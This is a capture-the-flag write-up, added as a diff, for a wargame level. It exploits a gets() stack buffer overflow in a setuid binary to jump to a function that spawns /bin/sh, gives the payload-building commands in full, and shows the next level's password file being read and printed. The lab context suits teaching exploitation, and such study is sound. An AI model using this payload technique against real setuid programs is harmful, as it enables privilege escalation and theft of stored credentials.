@@ -1,0 +1,55 @@
+```bash
+$ ls -la
+-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
+$ file level1
+level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
+```
+
+Reversed in c:
+```c
+int run(void)
+{
+    fwrite("Good... Wait what?\n", 1, 19, stdout);
+    return system("/bin/sh");
+}
+
+int main(int ac, const char **av, const char **env)
+{
+    char s[64];
+    
+    return gets(s);
+}
+```
+
+This is a simple stack buffer overflow.
+We overflow the stack and re-write the return address in the stack to jump in the fonction `run()`.
+Because the fonction args, return addresses and local variables are stocked in the stack.
+
+In this purpose, we write 64 bytes of junk and 4 bytes of the adddress where we want to jump.
+First we need to find the address of `run()`
+We use GDB or IDA for that:
+`(gdb) info adress run`
+`Symbol "run" is at 0x08048444 in a file compiled without debugging.`
+With IDA we just go in Exports symbols and we see the adress `0x08048444`
+We use this address because the executable is a not a PIE code
+
+So we want something like this:
+[76 bytes of junk] + [4 bytes: 0x08048444] + [4 bytes: 0xb7e454d3]
+
+note:
+the last 4 bytes is just for the beauty of the gest, 'cause when we are in the shell we don't care anymore, 0xb7e454d3 is the return address of main that allow the program to exit() properly
+
+We write the payload to a file:
+```bash
+printf 'A%.0s' {1..76} > /tmp/payload
+echo -ne "\x44\x84\x04\x08\xd3\x54\xe4\xb7" >> /tmp/payload
+```
+
+We start the executable with the payload as stdin and get the flag
+```bash
+cat /tmp/payload - | ./level1
+
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
